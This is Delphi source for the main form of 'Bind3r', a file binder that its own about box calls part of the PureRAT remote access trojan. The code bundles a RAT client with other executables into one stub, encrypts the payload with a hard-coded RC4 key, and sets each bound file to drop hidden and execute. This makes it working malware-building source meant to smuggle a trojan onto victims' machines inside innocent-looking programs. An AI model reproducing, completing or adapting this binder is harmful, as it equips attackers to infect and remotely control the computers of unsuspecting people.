unit UnitMain; //Original file Bind3r.exe by wrh1d3, modified by wrh1d3

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, Menus, ComCtrls, StdCtrls, ExtCtrls, UnitFunctions, XPMan, ShellAPI,
  ImgList, UnitRC4, WinSkinData;

type
  TFormMain = class(TForm)
    lv1: TListView;
    dlgOpen1: TOpenDialog;
    dlgSave1: TSaveDialog;
    pm1: TPopupMenu;
    A2: TMenuItem;
    D1: TMenuItem;
    pnl1: TPanel;
    chk1: TCheckBox;
    cbb1: TComboBoxEx;
    chk2: TCheckBox;
    xpmnfst1: TXPManifest;
    btn1: TButton;
    btn2: TButton;
    skndt1: TSkinData;
    lbl1: TLabel;
    procedure A2Click(Sender: TObject);
    procedure D1Click(Sender: TObject);
    procedure lv1SelectItem(Sender: TObject; Item: TListItem;
      Selected: Boolean);
    procedure chk1Click(Sender: TObject);
    procedure chk2Click(Sender: TObject);
    procedure cbb1Change(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure btn1Click(Sender: TObject);
    procedure btn2Click(Sender: TObject);
    procedure lv1Click(Sender: TObject);
    procedure FormShow(Sender: TObject);
  private
    ClientPath: string;
  public
    { Public declarations }
    procedure SetInfos(_ClientPath: string);
  end;
     
type
  TFileOptions = class
    Execute, Hidden: Boolean;
    Path: Integer;
  end;

var
  FormMain: TFormMain;
  BindedFile: string;
  ImagesList: TImageList;

const
  EncryptionPassword = '8lsrqxBIH5POLjvBmTAz3nY4dVXTLLnAvroM2WT5'; //You can change this password

implementation

{$R *.dfm}
          
procedure TFormMain.SetInfos(_ClientPath: string);
begin
  ClientPath := _ClientPath;
end;

procedure TFormMain.A2Click(Sender: TObject);
var
  TmpItem: TListItem;
  FileOptions: TFileOptions;
begin
  dlgOpen1.Title := 'Bind3r';
  dlgOpen1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgOpen1.Filter := 'All files (*.*)|*.*';
  if (not dlgOpen1.Execute) and (not FileExists(dlgOpen1.FileName)) then Exit;

  TmpItem := lv1.Items.Add;
  TmpItem.Caption := dlgOpen1.FileName;
  TmpItem.SubItems.Add(FileSizeToStr(MyGetFileSize(dlgOpen1.FileName)));
  TmpItem.SubItems.Add('Yes');
  TmpItem.SubItems.Add('Yes');
  TmpItem.ImageIndex := GetImageIndex(TmpItem.Caption);

  FileOptions := TFileOptions.Create;
  FileOptions.Hidden := MyStrToBool(TmpItem.SubItems[2]);
  FileOptions.Execute := MyStrToBool(TmpItem.SubItems[1]);
  FileOptions.Path := 3;
  TmpItem.Data := TObject(FileOptions);
end;
      
procedure TFormMain.FormShow(Sender: TObject);
var
  TmpItem: TListItem;
  FileOptions: TFileOptions;
begin
  if not FileExists(ClientPath) then
  begin
    MessageBox(Handle, PChar('File ' + ClientPath + ' not found.'), 'Bind3r', MB_ICONERROR);
    Exit;
  end;
  
  TmpItem := lv1.Items.Add;
  TmpItem.Caption := ClientPath;
  TmpItem.SubItems.Add(FileSizeToStr(MyGetFileSize(ClientPath)));
  TmpItem.SubItems.Add('Yes');
  TmpItem.SubItems.Add('Yes');
  TmpItem.ImageIndex := GetImageIndex(TmpItem.Caption);

  FileOptions := TFileOptions.Create;
  FileOptions.Hidden := MyStrToBool(TmpItem.SubItems[2]);
  FileOptions.Execute := MyStrToBool(TmpItem.SubItems[1]);
  FileOptions.Path := 3;
  TmpItem.Data := TObject(FileOptions);
end;

procedure TFormMain.D1Click(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then Exit;
  if lv1.Selected.Caption = ClientPath then Exit;
  lv1.Selected.Delete;
end;
    
procedure TFormMain.lv1SelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
  if not Assigned(lv1.Selected) then Exit;
  if lv1.Selected.Data <> nil then
  begin
    chk1.Checked := TFileOptions(lv1.Selected.Data).Hidden;
    cbb1.ItemIndex := TFileOptions(lv1.Selected.Data).Path;
    chk2.Checked := TFileOptions(lv1.Selected.Data).Execute;
  end;
end;
    
procedure TFormMain.chk1Click(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then Exit;    
  if lv1.Selected.Caption = ClientPath then Exit;
  lv1.Selected.SubItems[2] := MyBoolToStr(chk1.Checked);
  TFileOptions(lv1.Selected.Data).Hidden := chk1.Checked;
end;

procedure TFormMain.chk2Click(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then Exit;
  if lv1.Selected.Caption = ClientPath then Exit;
  lv1.Selected.SubItems[1] := MyBoolToStr(chk2.Checked);
  TFileOptions(lv1.Selected.Data).Execute := chk2.Checked;
end;

procedure TFormMain.cbb1Change(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then Exit;
  TFileOptions(lv1.Selected.Data).Path := cbb1.ItemIndex;
end;

procedure TFormMain.btn1Click(Sender: TObject);
var
  TmpStr, TmpStr1: string;
  TmpRes: TResourceStream;
  i: Integer;
begin
  if not FileExists(ClientPath) then
  begin
    MessageBox(Handle, PChar('File ' + ClientPath + ' not found.'), 'Bind3r', MB_ICONERROR);
    Exit;
  end;

  if lv1.Items.Count = 0 then
  begin
    MessageBox(Handle, 'Files not found.', 'Bind3r', MB_ICONERROR);
    Exit;
  end;

  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgSave1.Filter := 'Executable file (*.exe)|*.exe';
  dlgSave1.DefaultExt := 'exe';
  dlgSave1.FileName := ClientPath;
  if not dlgSave1.Execute then Exit;
  BindedFile := dlgSave1.FileName;
             
  TmpRes := TResourceStream.Create(HInstance, 'STUB', 'stubfile');
  TmpRes.SaveToFile(BindedFile);
  TmpRes.Free;

  for i := 0 to lv1.Items.Count - 1 do
  begin
    TmpStr := TmpStr + ExtractFileName(lv1.Items.Item[i].Caption) + '|' +
      IntToStr(TFileOptions(lv1.Items.Item[i].Data).Path) + '|' +      
      MyBoolToStr(TFileOptions(lv1.Items.Item[i].Data).Hidden) + '|' +
      MyBoolToStr(TFileOptions(lv1.Items.Item[i].Data).Execute) + '|' +
      IntToStr(MyGetFileSize(lv1.Items.Item[i].Caption)) + '|' +
      FileToStr(lv1.Items.Item[i].Caption);
  end;

  TmpStr := EnDecryptText(TmpStr, EncryptionPassword);
  
  if WriteResData(BindedFile, @TmpStr[1], Length(TmpStr), 'BNDS') = False then
    MessageBox(Handle, 'Failed to bind files.', 'Bind3r', MB_ICONERROR)
  else MessageBox(Handle, 'Files binded successfully!', 'Bind3r', MB_ICONINFORMATION);
end;

procedure TFormMain.btn2Click(Sender: TObject);
var
  TmpStr: string;
begin
  MessageBox(Handle, 'Bind3r allow you to bind client file with multiple executables files.' + #13#10 +
    'This files binder originaly coded for Opensc.ws is now a part of PureRAT.' + #13#10#13#10 +
    'Copyright (c) 2016-2017 J3kill Soft. by wrh1d3', 'Bind3r', MB_ICONINFORMATION);
end;

procedure TFormMain.FormCreate(Sender: TObject);
var
  SHFileInfo: TSHFileInfo;
begin
  FileIconInit(True);
  ImagesList := TImageList.CreateSize(16, 16);
  ImagesList.ShareImages := True;
  ImagesList.Handle := SHGetFileInfo('', FILE_ATTRIBUTE_NORMAL, SHFileInfo,
    SizeOf(SHFileInfo), SHGFI_SMALLICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SYSICONINDEX);

  lv1.SmallImages := ImagesList;
end;

procedure TFormMain.lv1Click(Sender: TObject);
begin
  if not Assigned(lv1.Selected) then
  begin
    chk1.Checked := False;
    chk2.Checked := False;
    cbb1.ItemIndex := -1;
  end;
end;

end.
